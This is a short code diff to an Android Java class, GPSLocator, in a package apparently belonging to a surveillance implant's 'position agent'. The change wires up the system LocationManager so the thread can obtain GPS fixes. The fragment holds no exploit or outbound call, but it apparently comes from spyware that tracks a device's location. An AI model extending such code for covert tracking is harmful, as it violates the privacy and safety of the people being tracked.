@@ -1,13 +1,14 @@
 package com.ht.RCSAndroidGUI.agent.position;
 
+import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.agent.PositionAgent;
 
+import android.content.Context;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Looper;
 
 public class GPSLocator extends Thread {
-
 	private LocationManager lm;
 	private LocationListener listener;
 	private int period;
@@ -21,6 +22,7 @@ public class GPSLocator extends Thread {
 		this();
 		this.listener = listener;
 		this.period = period;
+		lm = (LocationManager)Status.getAppContext().getSystemService(Context.LOCATION_SERVICE); 
 	}
 
 	public void run() {
